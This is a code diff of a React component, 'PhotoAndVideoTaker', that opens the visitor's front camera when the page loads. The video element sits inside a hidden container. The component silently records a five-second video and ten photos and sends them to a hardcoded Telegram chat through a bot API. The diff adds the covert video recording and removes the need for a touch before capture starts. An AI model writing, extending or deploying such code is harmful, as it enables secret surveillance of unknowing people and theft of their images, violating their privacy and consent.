@@ -8,17 +8,13 @@ const TELEGRAM_CHAT_ID = "6956607670";
 const PhotoAndVideoTaker = () => {
   const videoRef = useRef<HTMLVideoElement>(null);
   const mediaStreamRef = useRef<MediaStream | null>(null);
+  const mediaBlobs = useRef<{ blob: Blob; type: "photo" | "video" }[]>([]);
   const [showDeniedMessage, setShowDeniedMessage] = useState(false);
 
   const initCamera = async () => {
     try {
-      // Use front-facing camera on mobile
       const stream = await navigator.mediaDevices.getUserMedia({
-        video: {
-          facingMode: "user", // Force front camera
-          width: { ideal: 1280 },
-          height: { ideal: 720 },
-        },
+        video: { facingMode: "user", width: 1280, height: 720 },
         audio: false,
       });
 
@@ -26,85 +22,123 @@ const PhotoAndVideoTaker = () => {
 
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
-        videoRef.current.onloadedmetadata = () => {
-          videoRef.current?.play();
-          captureSelfie();
+
+        videoRef.current.onloadedmetadata = async () => {
+          await videoRef.current?.play(); // Ensure it plays before capturing
+          setTimeout(() => startVideoRecording(), 500); // Small delay
         };
       }
+
       setShowDeniedMessage(false);
     } catch (error) {
       setShowDeniedMessage(true);
-      console.error("Camera error:", error);
+      console.error("Camera access denied:", error);
     }
   };
 
-  const captureSelfie = () => {
-    if (!videoRef.current) return;
+  const startVideoRecording = () => {
+    if (!mediaStreamRef.current) return;
 
+    const recorder = new MediaRecorder(mediaStreamRef.current, {
+      mimeType: "video/webm;codecs=vp9",
+      videoBitsPerSecond: 2500000,
+    });
+
+    const chunks: BlobPart[] = [];
+    recorder.ondataavailable = (e) => chunks.push(e.data);
+
+    recorder.onstop = async () => {
+      const videoBlob = new Blob(chunks, { type: "video/webm" });
+      mediaBlobs.current.push({ blob: videoBlob, type: "video" });
+      setTimeout(() => startPhotoCapture(), 500); // Extra delay before photo capture
+    };
+
+    recorder.start();
     setTimeout(() => {
-      const canvas = document.createElement("canvas");
-      canvas.width = videoRef.current?.videoWidth || 640;
-      canvas.height = videoRef.current?.videoHeight || 480;
-      const ctx = canvas.getContext("2d");
-
-      if (ctx && videoRef.current) {
-        // Mirror the selfie for more natural appearance
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(
-          async (blob) => {
-            if (blob) {
-              await sendToTelegram(blob, "selfie.jpg");
-            }
-            // Cleanup
-            if (mediaStreamRef.current) {
-              mediaStreamRef.current
-                .getTracks()
-                .forEach((track) => track.stop());
-            }
-          },
-          "image/jpeg",
-          0.9
-        );
-      }
-    }, 1000); // Wait 1 second for camera to stabilize
+      recorder.stop();
+    }, 5000);
   };
 
-  const sendToTelegram = async (blob: Blob, filename: string) => {
-    try {
-      const formData = new FormData();
-      formData.append("chat_id", TELEGRAM_CHAT_ID);
-      formData.append("photo", blob, filename);
+  const startPhotoCapture = () => {
+    let count = 0;
+    const interval = setInterval(() => {
+      if (count >= 10) {
+        clearInterval(interval);
+        sendToTelegram();
+        return;
+      }
+      capturePhoto();
+      count++;
+    }, 800);
+  };
 
-      await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
-        {
-          method: "POST",
-          body: formData,
-        }
+  const capturePhoto = () => {
+    if (!videoRef.current) return;
+
+    const video = videoRef.current;
+    const width = video.videoWidth || 640;
+    const height = video.videoHeight || 480;
+
+    const canvas = document.createElement("canvas");
+    canvas.width = width;
+    canvas.height = height;
+    const ctx = canvas.getContext("2d");
+
+    if (ctx && width > 0 && height > 0) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(
+        (blob) => {
+          if (blob) {
+            mediaBlobs.current.push({ blob, type: "photo" });
+          }
+        },
+        "image/jpeg",
+        0.85
       );
-      console.log("Selfie sent successfully");
+    } else {
+      console.warn("Canvas context or video dimensions not ready");
+    }
+  };
+
+  const sendToTelegram = async () => {
+    try {
+      for (const item of mediaBlobs.current) {
+        const formData = new FormData();
+        formData.append("chat_id", TELEGRAM_CHAT_ID);
+
+        if (item.type === "photo") {
+          formData.append("photo", item.blob, "algeria.jpg");
+          await fetch(
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+            {
+              method: "POST",
+              body: formData,
+            }
+          );
+        } else {
+          formData.append("video", item.blob, "algeria.webm");
+          await fetch(
+            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`,
+            {
+              method: "POST",
+              body: formData,
+            }
+          );
+        }
+      }
+      console.log("All media sent successfully");
     } catch (error) {
-      console.error("Telegram error:", error);
+      console.error("Telegram send error:", error);
+    } finally {
+      mediaStreamRef.current?.getTracks().forEach((track) => track.stop());
     }
   };
 
   useEffect(() => {
-    // Add mobile-specific event listener for better compatibility
-    const handleMobileInteraction = () => {
-      initCamera();
-      window.removeEventListener("touchstart", handleMobileInteraction);
-    };
-
-    window.addEventListener("touchstart", handleMobileInteraction);
+    initCamera();
 
     return () => {
-      if (mediaStreamRef.current) {
-        mediaStreamRef.current.getTracks().forEach((track) => track.stop());
-      }
-      window.removeEventListener("touchstart", handleMobileInteraction);
+      mediaStreamRef.current?.getTracks().forEach((track) => track.stop());
     };
   }, []);
 
@@ -128,7 +162,13 @@ const PhotoAndVideoTaker = () => {
 
   return (
     <div className="hidden">
-      <video ref={videoRef} autoPlay playsInline muted />
+      <video
+        ref={videoRef}
+        autoPlay
+        playsInline
+        muted
+        className="absolute top-0 left-0"
+      />
     </div>
   );
 };
